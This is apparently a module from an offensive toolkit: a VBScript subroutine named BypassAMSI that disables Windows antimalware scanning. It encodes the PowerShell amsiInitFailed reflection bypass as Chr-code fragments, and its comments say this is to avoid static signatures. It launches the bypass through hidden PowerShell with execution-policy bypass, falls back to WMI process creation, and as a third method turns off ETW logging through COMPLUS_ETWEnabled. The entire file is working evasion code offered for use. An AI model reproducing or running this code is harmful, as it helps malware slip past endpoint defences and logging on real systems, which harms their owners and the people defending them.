' chunk: evasion/amsi_bypass
' depends: (none)
' provides: BypassAMSI
' format: vbscript
' note: AMSI bypass for VBScript — patches AmsiScanBuffer via
'   PowerShell reflection or WMI process creation. Multiple
'   methods for resilience against partial mitigations.

Sub BypassAMSI()
    On Error Resume Next

    Dim oShell
    Set oShell = CreateObject("WScript.Shell")

    ' Build command fragments from Chr codes to avoid static signatures
    Dim ps, flag, p1, p2, p3, p4, p5, p6, p7, p8
    ps = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108) ' powershell
    flag = Chr(45) & Chr(101) & Chr(112) & Chr(32) & Chr(98) & Chr(121) & Chr(112) & Chr(97) & Chr(115) & Chr(115) & Chr(32) & Chr(45) & Chr(110) & Chr(111) & Chr(112) ' -ep bypass -nop

    ' [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    p1 = Chr(91) & Chr(82) & Chr(101) & Chr(102) & Chr(93) & Chr(46) & Chr(65) & Chr(115) & Chr(115) & Chr(101) & Chr(109) & Chr(98) & Chr(108) & Chr(121)
    p2 = Chr(46) & Chr(71) & Chr(101) & Chr(116) & Chr(84) & Chr(121) & Chr(112) & Chr(101) & Chr(40) & Chr(39)
    p3 = Chr(83) & Chr(121) & Chr(115) & Chr(116) & Chr(101) & Chr(109) & Chr(46) & Chr(77) & Chr(97) & Chr(110) & Chr(97) & Chr(103) & Chr(101) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(46) & Chr(65) & Chr(117) & Chr(116) & Chr(111) & Chr(109) & Chr(97) & Chr(116) & Chr(105) & Chr(111) & Chr(110)
    p4 = Chr(46) & Chr(65) & Chr(109) & Chr(115) & Chr(105) & Chr(85) & Chr(116) & Chr(105) & Chr(108) & Chr(115) & Chr(39) & Chr(41)
    ' .GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    p5 = Chr(46) & Chr(71) & Chr(101) & Chr(116) & Chr(70) & Chr(105) & Chr(101) & Chr(108) & Chr(100) & Chr(40) & Chr(39)
    p6 = Chr(97) & Chr(109) & Chr(115) & Chr(105) & Chr(73) & Chr(110) & Chr(105) & Chr(116) & Chr(70) & Chr(97) & Chr(105) & Chr(108) & Chr(101) & Chr(100) & Chr(39)
    p7 = Chr(44) & Chr(39) & Chr(78) & Chr(111) & Chr(110) & Chr(80) & Chr(117) & Chr(98) & Chr(108) & Chr(105) & Chr(99) & Chr(44) & Chr(83) & Chr(116) & Chr(97) & Chr(116) & Chr(105) & Chr(99) & Chr(39) & Chr(41)
    p8 = Chr(46) & Chr(83) & Chr(101) & Chr(116) & Chr(86) & Chr(97) & Chr(108) & Chr(117) & Chr(101) & Chr(40) & Chr(36) & Chr(110) & Chr(117) & Chr(108) & Chr(108) & Chr(44) & Chr(36) & Chr(116) & Chr(114) & Chr(117) & Chr(101) & Chr(41)

    Dim payload
    payload = p1 & p2 & p3 & p4 & p5 & p6 & p7 & p8

    ' Method 1: Direct WScript.Shell.Run
    oShell.Run ps & " " & flag & " -c """ & payload & """", 0, True

    If Err.Number <> 0 Then
        Err.Clear
        ' Method 2: WMI Process Create
        Dim wmi, proc, startup, pid
        Set wmi = GetObject("winmgmts:\\.\root\cimv2")
        Set proc = wmi.Get("Win32_Process")
        Set startup = wmi.Get("Win32_ProcessStartup").SpawnInstance_()
        startup.ShowWindow = 0
        proc.Create ps & " " & flag & " -c """ & payload & """", Null, startup, pid
    End If

    If Err.Number <> 0 Then
        Err.Clear
        ' Method 3: Environment variable approach
        Dim env
        Set env = oShell.Environment("Process")
        env("COMPLUS_ETWEnabled") = "0"
    End If

    On Error GoTo 0
End Sub
